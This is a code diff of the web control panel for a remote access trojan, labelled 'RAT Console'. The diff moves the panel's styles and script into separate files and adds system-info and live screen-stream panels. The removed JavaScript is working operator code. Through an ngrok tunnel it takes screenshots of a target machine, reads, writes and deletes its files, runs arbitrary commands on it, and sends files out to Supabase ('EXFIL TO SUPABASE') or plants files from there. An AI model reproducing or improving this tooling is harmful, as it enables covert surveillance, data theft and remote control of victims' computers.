@@ -3,219 +3,8 @@
 	<head>
 		<meta charset="UTF-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link rel="stylesheet" href="app.css" />
 		<title>RAT Console</title>
-		<style>
-			* {
-				box-sizing: border-box;
-				margin: 0;
-				padding: 0;
-			}
-			body {
-				font-family: "Segoe UI", system-ui, sans-serif;
-				background: #000;
-				color: #e0e0e0;
-				padding: 24px;
-			}
-			h1 {
-				color: #ffffff;
-				margin-bottom: 20px;
-				font-size: 1.5rem;
-				letter-spacing: 1px;
-				text-transform: uppercase;
-				border-bottom: 1px solid #333;
-				padding-bottom: 12px;
-			}
-			.grid {
-				display: grid;
-				grid-template-columns: 1fr 1fr;
-				gap: 16px;
-			}
-			.full {
-				grid-column: 1 / -1;
-			}
-			.card {
-				background: #111;
-				border: 1px solid #333;
-				border-radius: 0;
-				padding: 16px;
-			}
-			.card h2 {
-				font-size: 0.85rem;
-				color: #ffffff;
-				margin-bottom: 10px;
-				border-bottom: 1px solid #222;
-				padding-bottom: 6px;
-				text-transform: uppercase;
-				letter-spacing: 0.5px;
-				font-weight: 400;
-			}
-			label {
-				display: block;
-				font-size: 0.78rem;
-				color: #888;
-				margin: 8px 0 4px;
-				text-transform: uppercase;
-				letter-spacing: 0.3px;
-			}
-			input[type="text"],
-			textarea {
-				width: 100%;
-				background: #0a0a0a;
-				border: 1px solid #333;
-				border-radius: 0;
-				padding: 8px 10px;
-				color: #e0e0e0;
-				font-size: 0.85rem;
-			}
-			input[type="text"]:focus,
-			textarea:focus {
-				outline: none;
-				border-color: #666;
-			}
-			textarea {
-				font-family: "Consolas", "Courier New", monospace;
-				resize: vertical;
-				min-height: 80px;
-			}
-			button {
-				background: #1a1a1a;
-				color: #e0e0e0;
-				border: 1px solid #444;
-				border-radius: 0;
-				padding: 6px 16px;
-				font-size: 0.8rem;
-				cursor: pointer;
-				margin-top: 8px;
-				transition: 0.1s;
-				text-transform: uppercase;
-				letter-spacing: 0.5px;
-			}
-			button:hover {
-				background: #333;
-				border-color: #888;
-				color: #fff;
-			}
-			.output {
-				background: #0a0a0a;
-				border: 1px solid #333;
-				border-radius: 0;
-				padding: 10px;
-				margin-top: 10px;
-				font-family: "Consolas", "Courier New", monospace;
-				font-size: 0.78rem;
-				max-height: 300px;
-				overflow-y: auto;
-				white-space: pre-wrap;
-				word-break: break-all;
-				color: #ccc;
-			}
-			.output.success {
-				border-color: #888;
-			}
-			.output.error {
-				border-color: #fff;
-				color: #fff;
-				background: #1a0000;
-			}
-			img {
-				max-width: 100%;
-				margin-top: 10px;
-				border: 1px solid #333;
-				border-radius: 0;
-			}
-			.row {
-				display: flex;
-				gap: 8px;
-				align-items: end;
-			}
-			.row > * {
-				flex: 1;
-			}
-			.status-bar {
-				display: flex;
-				gap: 16px;
-				margin-bottom: 16px;
-				padding: 8px 0;
-				border-bottom: 1px solid #222;
-				font-size: 0.75rem;
-				color: #666;
-				text-transform: uppercase;
-				letter-spacing: 0.5px;
-			}
-			.status-bar span {
-				color: #aaa;
-			}
-			.status-dot {
-				display: inline-block;
-				width: 8px;
-				height: 8px;
-				background: #444;
-				margin-right: 6px;
-			}
-			.status-dot.online {
-				background: #fff;
-			}
-			.status-dot.offline {
-				background: #ff4444;
-			}
-			hr {
-				border: none;
-				border-top: 1px solid #222;
-				margin: 12px 0;
-			}
-
-			/* CONNECT SCREEN */
-			#connect-screen {
-				display: flex;
-				align-items: center;
-				justify-content: center;
-				min-height: 80vh;
-			}
-			#connect-screen .card {
-				width: 500px;
-				padding: 32px;
-			}
-			#connect-screen h1 {
-				text-align: center;
-				border-bottom: none;
-				margin-bottom: 24px;
-				font-size: 1.8rem;
-			}
-			#connect-screen .subtitle {
-				text-align: center;
-				color: #666;
-				font-size: 0.78rem;
-				text-transform: uppercase;
-				letter-spacing: 0.5px;
-				margin-bottom: 24px;
-			}
-			#connect-screen label {
-				margin-top: 0;
-			}
-
-			#connect-screen .connect-btn {
-				width: 100%;
-				padding: 12px;
-				font-size: 0.9rem;
-				margin-top: 16px;
-				background: #222;
-				border-color: #555;
-			}
-			#connect-screen .connect-btn:hover {
-				background: #444;
-				border-color: #aaa;
-			}
-			#connect-screen .error {
-				color: #ff4444;
-				text-align: center;
-				margin-top: 12px;
-				font-size: 0.8rem;
-			}
-
-			#main-screen {
-				display: none;
-			}
-		</style>
 	</head>
 	<body>
 		<!-- CONNECT SCREEN -->
@@ -258,6 +47,11 @@
 			<h1>☠ remote console</h1>
 
 			<div class="grid">
+				<!-- SYSTEM INFO -->
+				<div class="card">
+					<h2>system info</h2>
+					<div id="sysinfo-output" class="output">—</div>
+				</div>
 				<!-- SCREENSHOT -->
 				<div class="card full">
 					<h2>screenshot</h2>
@@ -391,250 +185,45 @@
 					<div id="cmd-output" class="output">—</div>
 				</div>
 			</div>
+			<!-- SCREEN STREAM -->
+			<div class="card full" style="margin-top: 14px">
+				<h2>screen stream</h2>
+				<div class="row" style="align-items: center">
+					<button onclick="startStream()" id="stream-start-btn">
+						start stream
+					</button>
+					<button
+						onclick="stopStream()"
+						id="stream-stop-btn"
+						style="display: none"
+					>
+						stop stream
+					</button>
+				</div>
+				<div
+					id="stream-output"
+					style="
+						text-align: center;
+						padding: 20px 0;
+						color: #666;
+						font-size: 0.8rem;
+					"
+				>
+					<video
+						id="video-stream"
+						style="
+							max-width: 100%;
+							border: 1px solid #333;
+							margin-top: 10px;
+							display: block;
+						"
+						autoplay
+						playsinline
+					></video>
+				</div>
+			</div>
 		</div>
 
-		<script>
-			let BASE = "";
-
-			// ----- CONNECT SCREEN -----
-			function setAddress(addr) {
-				document.getElementById("server-address").value = addr;
-			}
-
-			async function connect() {
-				const addr = document
-					.getElementById("server-address")
-					.value.trim();
-				if (!addr) {
-					document.getElementById("connect-error").textContent =
-						"enter a server address";
-					return;
-				}
-
-				// Strip trailing slash
-				BASE = addr.replace(/\/+$/, "");
-
-				// Test connection
-				try {
-					const res = await fetch(BASE + "/", {
-						headers: { "ngrok-skip-browser-warning": "true" },
-					});
-					let text = await res.text();
-					text = text.replaceAll('"', "");
-					if (text !== "Target Connected") {
-						document.getElementById("connect-error").textContent =
-							"unexpected response: " + text;
-						return;
-					}
-				} catch (e) {
-					document.getElementById("connect-error").textContent =
-						"connection failed: " + e.message;
-					return;
-				}
-
-				// Switch to main screen
-				document.getElementById("connect-screen").style.display =
-					"none";
-				document.getElementById("main-screen").style.display = "block";
-				document.getElementById("status-target").textContent = BASE;
-			}
-
-			function disconnect() {
-				BASE = "";
-				document.getElementById("main-screen").style.display = "none";
-				document.getElementById("connect-screen").style.display =
-					"flex";
-				document.getElementById("connect-error").textContent = "";
-			}
-
-			// ----- UTILITY -----
-			async function api(url) {
-				const res = await fetch(url, {
-					headers: {
-						"ngrok-skip-browser-warning": "true",
-					},
-				});
-				if (!res.ok) throw new Error(`HTTP ${res.status}`);
-				return res;
-			}
-
-			function show(el, content, ok = true) {
-				const div = document.getElementById(el);
-				div.textContent = content;
-				div.className = "output " + (ok ? "success" : "error");
-			}
-
-			// ----- SCREENSHOT -----
-			async function takeScreenshot() {
-				const out = document.getElementById("screenshot-output");
-				try {
-					const res = await api(`${BASE}/screenshot`);
-					const blob = await res.blob();
-					const url = URL.createObjectURL(blob);
-					out.innerHTML = `<img src="${url}" alt="screenshot" />`;
-				} catch (e) {
-					out.innerHTML = `<div class="output error">${e.message}</div>`;
-				}
-			}
-
-			// ----- DIRECTORY LISTING -----
-			async function listDir() {
-				const path = document.getElementById("dir-path").value || "";
-				try {
-					const res = await api(
-						`${BASE}/getdir${path !== "" ? "?path=" + encodeURIComponent(path) : ""}`,
-					);
-					const data = await res.json();
-					show(
-						"dir-output",
-						Array.isArray(data) ? data.join("\n") : data,
-						true,
-					);
-				} catch (e) {
-					show("dir-output", e.message, false);
-				}
-			}
-
-			// ----- READ FILE -----
-			async function readFile() {
-				const path = document.getElementById("read-path").value;
-				try {
-					const res = await api(
-						`${BASE}/readfile?path=${encodeURIComponent(path)}`,
-					);
-					const text = await res.text();
-					const formatted = text
-						.replace(/&/g, "&amp;")
-						.replace(/</g, "&lt;")
-						.replace(/>/g, "&gt;")
-						.replace(/\r\n/g, "\n")
-						.replace(/\n/g, "<br>")
-						.replace(/\t/g, "&nbsp;&nbsp;&nbsp;&nbsp;");
-					const div = document.getElementById("read-output");
-					div.innerHTML = formatted;
-					div.className = "output success";
-				} catch (e) {
-					show("read-output", e.message, false);
-				}
-			}
-
-			// ----- CREATE FILE -----
-			async function createFile() {
-				const path = document.getElementById("create-path").value;
-				const content = document.getElementById("create-content").value;
-				try {
-					const res = await api(
-						`${BASE}/createfile?path=${encodeURIComponent(path)}&content=${encodeURIComponent(content)}`,
-					);
-					const text = await res.text();
-					show("create-output", "created / written: " + text, true);
-				} catch (e) {
-					show("create-output", e.message, false);
-				}
-			}
-
-			// ----- DELETE FILE -----
-			async function deleteFile() {
-				const path = document.getElementById("delete-path").value;
-				try {
-					const res = await api(
-						`${BASE}/removefile?path=${encodeURIComponent(path)}`,
-					);
-					const text = await res.text();
-					show("delete-output", text, true);
-				} catch (e) {
-					show("delete-output", e.message, false);
-				}
-			}
-
-			// ----- DELETE FOLDER -----
-			async function deleteFolder() {
-				const path = document.getElementById("delete-path").value;
-				try {
-					const res = await api(
-						`${BASE}/removefolder?path=${encodeURIComponent(path)}`,
-					);
-					const text = await res.text();
-					show("delete-output", text, true);
-				} catch (e) {
-					show("delete-output", e.message, false);
-				}
-			}
-
-			// ----- DOWNLOAD (EXFIL TO SUPABASE) -----
-			async function downloadFile() {
-				const path = document.getElementById("download-path").value;
-				try {
-					const res = await api(
-						`${BASE}/downloadfile?path=${encodeURIComponent(path)}`,
-					);
-					let text = await res.text();
-					const url = text.replaceAll('"', "");
-					if (url.startsWith("http")) {
-						const a = document.createElement("a");
-						a.href = url;
-						a.target = "_blank";
-						a.click();
-					} else {
-						show("download-output", url, false);
-					}
-				} catch (e) {
-					show("download-output", e.message, false);
-				}
-			}
-
-			// ----- UPLOAD (FETCH FROM SUPABASE) -----
-			async function uploadFile() {
-				const dwpath = document.getElementById("upload-path").value;
-				const dbfilename =
-					document.getElementById("upload-filename").value;
-				try {
-					const res = await api(
-						`${BASE}/uploadfile?dwpath=${encodeURIComponent(dwpath)}&dbfilename=${encodeURIComponent(dbfilename)}`,
-					);
-					const text = await res.text();
-					show("upload-output", text, true);
-				} catch (e) {
-					show("upload-output", e.message, false);
-				}
-			}
-
-			// ----- CMD -----
-			async function runCmd() {
-				const cmd = document.getElementById("cmd-cmd").value;
-				const path = document.getElementById("cmd-path").value;
-				try {
-					const res = await api(
-						`${BASE}/cmd?cmd=${encodeURIComponent(cmd)}&path=${encodeURIComponent(path)}`,
-					);
-					const data = await res.json();
-					let out = "";
-					if (data.stdout) out += data.stdout;
-					if (data.stderr) out += "\n[stderr]\n" + data.stderr;
-					out += `\n[exit code: ${data.code}]`;
-					show("cmd-output", out, data.code === 0);
-				} catch (e) {
-					show("cmd-output", e.message, false);
-				}
-			}
-
-			// Enter key on ngrok field triggers connect
-			document
-				.getElementById("ngrok-address")
-				.addEventListener("keydown", function (e) {
-					if (e.key === "Enter") {
-						setNgrokAddress();
-						connect();
-					}
-				});
-
-			document
-				.getElementById("server-address")
-				.addEventListener("keydown", function (e) {
-					if (e.key === "Enter") {
-						connect();
-					}
-				});
-		</script>
+		<script src="script.js"></script>
 	</body>
 </html>
